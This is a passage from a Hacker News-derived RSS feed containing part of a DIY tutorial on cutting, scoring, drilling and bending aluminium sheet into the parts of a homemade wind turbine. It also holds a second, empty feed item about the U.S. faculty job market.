<p>Tape the pages together so that the 10cm dimension marks overlap  as closely as possible. Best way to do this is on a window pane  during the day, so you can see both pages showing through.<br>
  With  a craft knife and the angle aluminium as a straight edge, cut out the  outer border of the template.<br>
  Any time you're cutting, always  make sure your other hand is never in front of the knife, so if you  slip you're not going to slice yourself. The angle aluminium is good  for this, as the vertical bit effectively shields the hand holding  it.</p>
<p><strong>2</strong><strong>:</strong><br>
  Take an aluminium sheet  and measure a box 42cm x 48cm. Draw a line half way up the 48cm  length so you have two boxes measuring 42cm x 24cm. Score the outer  lines with the Stanley knife and straight edge. You're not trying to  cut through the metal, just create a line that can then be popped out  later. A good method is to score once lightly, then a second time a  bit deeper.<br>
  Do not score the 24cm halfway line.</p>
<p>Flex the metal so that it bends at a score line, then flex back  the other way. Do this a couple times and it should split. Do the  same for the other score and remove the outer metal. Keep it for  later. </p>
<p><strong>3</strong><strong>:</strong><br>
  Tape the template to the  metal rectangle (from now on to be referred to as a 'former') so that  the long edge of the paper sits on the middle line and the right hand  edges of both line up. Don't worry if the other edges don't align  perfectly.</p>
<p>With blade and straight edge, score out the template curve,  including the triangles at each end. It's not essential that this be  100% perfect, but try to get the first one reasonably nice as you can  then use it as a template for the rest.</p>
<p>Score, flex, and remove the two triangles of metal outside the  template.</p>
<p><strong>4</strong><strong>:</strong><br>
  Mark the centers of the  little circles on the paper template with a marker pen so that  they're visible from the other side and flip the paper over so that  the printed side is down on the other half of the former, keeping the  long edge on the middle line. Retape so it doesn't shift.<br>
  Give  the curved score a couple of flexes and tear it out. Remove the two  small triangles. Be careful not to bend the unscored metal too much  as you're doing this as it may weaken it.</p>
<p>You now have your first former. Repeat steps 2 through 3 so that  you have a total of 6 formers. You can use the first former as a  cutting template rather than the paper. On three of the formers have  the 24cm line drawn on the front, the other three on the back.</p>
<p><strong>5</strong><strong>:</strong><br>
  Take all six formers and peg them together  so that they are as nicely aligned as possible.<br>
  Use tape to  attach them if you don't have clothes pegs. </p>
<p>Drill each of the 16 holes through all six formers with a 4mm bit.  Drill the center hole first, as this is the only one that needs to be  reasonably accurate. It can help to put a bolt through that first  hole to keep the formers from shifting around as you drill.</p>
<p>If the holes on your template are laid out a little differently  than those in the animation it'll be because the template is more  up to date.</p>
<p>Remove the template and unpeg the formers.<br>
  Place a former  with the 24cm line slightly overhanging the edge of the table. Place  the straight edge on the middle line and bend up to 90 degrees.  Repeat with all six, with three formers bent shiny side up and three  bent shiny side down. <br>
  Put the formers aside. </p>
<p><strong>6</strong><strong>:</strong><br>
  Take an aluminium sheet  and flatten out any bends in the metal. Cut the long edge down to  67cm.</p>
<p>Draw a line 2cm from one of the 67cm edges, flip the sheet over  and draw another line 2cm from the opposite edge on the other side of  the metal.</p>
<p>repeat with 2 more sheets and peg all 3 together so that each  drawn line is aligned to the edge of the sheet above it.</p>
<p>Mark the edge at 4cm, 6, 8, 10, 18, 26, 34, and then every 2cm up  to and including 64cm<br>
  Keep in mind that one side has a score at  4cm from the edge, the other at 3cm.</p>
<p>Flip the sheets over, making sure they don't lose their alignment.  Mark and score the same as the first edge. Make sure both have the  4cm gap on the same edge.</p>
<p><strong>7</strong><strong>:</strong><br>
  Tap the sheets on the  table so that they are aligned on top of each other.<br>
  From the  4cm end draw a vertical line at 19cm from the edge, and one at 33cm  from the edge.<br>
  Mark each line at 3cm and 20cm from both ends.</p>
<p>Drill all 3 sheets with 4mm holes at all 8 marks. If you're  making a six vane turbine rather than three you can drill all six  sheets at once as easily.<br>
  Unpeg the sheets.</p>
<p><strong>8:</strong><br>
  Place a sheet so that the second 3cm edge is  overhanging the table. Place the straight edge on …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://opensourcelowtech.org/wind_turbine.html">http://opensourcelowtech.org/wind_turbine.html</a></em></p>]]>
            </description>
            <link>http://opensourcelowtech.org/wind_turbine.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24865731</guid>
            <pubDate>Fri, 23 Oct 2020 03:17:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[U.S. faculty job market tanks]]>
            </title>
            <description>
<![CDATA[
Score 258 | Comments 259 (<a href="https://news.ycombinator.com/item?id=24864838">thread link</a>) | @SQL2219
<br/>
October 22, 2020 | https://sci-hub.st/10.1126/science.370.6514.272 | <a href="https://web.archive.org/web/*/https://sci-hub.st/10.1126/science.370.6514.272">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://sci-hub.st/10.1126/science.370.6514.272</link>
            <guid isPermaLink="false">hacker-news-small-sites-24864838</guid>
            <pubDate>Fri, 23 Oct 2020 00:20:10 GMT</pubDate>
        </item>
    </channel>
</rss>
